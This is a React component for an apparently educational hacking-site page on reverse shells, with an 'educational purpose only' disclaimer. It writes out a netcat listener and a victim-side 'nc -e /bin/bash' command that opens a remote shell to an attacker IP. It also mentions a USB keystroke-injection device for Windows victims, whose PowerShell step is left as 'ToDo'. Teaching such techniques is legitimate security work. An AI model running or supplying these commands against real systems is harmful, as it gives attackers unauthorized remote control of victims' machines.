import React from "react";
import Navbar from "./Navbar";
import FishingLogo from "../assets/reverseShell/reverseShell.png";
import Footer from "./Footer";
import Terminal from "./Terminal";
import a1 from "../assets/reverseShell/1.png";
import a2 from "../assets/reverseShell/2.png";
import a3 from "../assets/reverseShell/3.png";
import a4 from "../assets/reverseShell/4.png";
import a5 from "../assets/reverseShell/5.png";
import a6 from "../assets/reverseShell/6.png";
import REVERSE_SHELL from "../assets/reverseShell/REVERSE SHELL.png";


export default function ReverseShell() {
  window.scrollTo(0, 0);
  return (
    <>
      {/* Intro */}
      <div className="bg-gradient-to-r from-black to-[#003706]">
        <div className="relative mx-auto max-w-7xl text-white py-28 flex flex-col justify-center items-center gap-5 lg:py-32 lg:gap-10">
          <Navbar></Navbar>
          <img src={FishingLogo} alt="fishing" className="w-40 lg:w-72" />
          <h1 className="font-juli text-3xl md:text-5xl">Reverse Shell</h1>
          <p className="font-advent text-lg text-center text-[rgba(255,255,255,0.68)] px-2 md:text-2xl sm:px-10 xl:px-56 lg:text-start">
            A reverse shell is a type of shell connection initiated by a target
            system to a remote system. In a traditional shell connection, a
            client connects to a server to obtain a shell. In a reverse shell
            scenario, the server (attacker-controlled system) listens for an
            incoming connection from the target system, and once the connection
            is established, the attacker gains control over the target's
            shell.Here's a simplified
          </p>
        </div>
      </div>

      <div className="mx-auto max-w-7xl ">

        {/* Disclaimer */}
        <div className="text-white space-y-5 px-2 my-10 lg:my-10 lg:px-48 ">
          <h1 className="font-handjet text-red-500 text-3xl md:text-5xl text-center">
            Disclaimer: Educational Purpose Only
          </h1>
          <p className="font-ibm text-red-500 text-xs px-2 font-semibold">
            The tools provided herein are intended solely for educational
            purposes. Users are reminded that any utilization of these tools in
            any other context, including but not limited to commercial,
            professional, or non-educational settings, is strictly prohibited.
            The creators and distributors of these tools do not endorse or
            encourage any misuse, unauthorized access, or any activities that
            violate applicable laws or regulations.
          </p>
        </div>

        <img src={REVERSE_SHELL} alt="" className="lg:mx-auto my-5 lg:mb-20 shadow-2xl"/>

        {/* Linux and Linux */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">1st Scenario :</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            if attacker OS is Linux and Victim Os is lInux too
          </h2>
          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Attacker Side (on terminal):
          </h2>
          <Terminal text="sudo nc -lnvp 87 -s 172.28.242.5"></Terminal>

          <img src={a1} alt="terminal" className="my-5 md:max-w-2xl" />
          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Victim Side (on terminal):
          </h2>
          <Terminal text="sudo nc -e /bin/bash 172.28.242.5 87"></Terminal>

          <img src={a2} alt="terminal" className="my-5 md:max-w-2xl" />

          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            We got the Access (attackers terminal):
          </h2>
          <img src={a3} alt="terminal" className="my-5 md:max-w-2xl" />
        </div>

        {/* Linux and Windows */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">2nd Scenario :</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            if attacker OS is Linux and Victim Os is Windows{" "}
          </h2>
          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Attacker Side (on terminal):
          </h2>
          <Terminal text="nc -lvnp 9001"></Terminal>

          <img src={a4} alt="terminal" className="my-5 md:max-w-2xl" />
          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Victim Side (on powershell):
          </h2>
          <Terminal text='ToDo'></Terminal>

          <img src={a5} alt="terminal" className="my-5 md:max-w-2xl" />

          <h2 className="font-lec font-bold text-[#B80000] text-sm lg:text-2xl">
            (Note : We use Ducky to trigger the command in victim system)
          </h2>

          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
          We got the Access (one attackers terminal):
          </h2>
          <img src={a6} alt="terminal" className="my-5 md:max-w-2xl" />
        </div>
        
      </div>
      <Footer></Footer>
    </>
  );
}
